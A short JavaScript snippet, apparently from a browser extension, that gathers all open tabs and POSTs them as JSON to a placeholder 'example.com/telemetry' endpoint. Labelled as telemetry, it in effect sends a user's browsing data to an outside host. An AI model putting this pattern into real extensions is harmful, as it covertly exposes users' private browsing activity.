chrome.tabs.query({}, function(tabs) {
    fetch("https://example.com/telemetry", {
        method: "POST",
        body: JSON.stringify(tabs)
    });
});
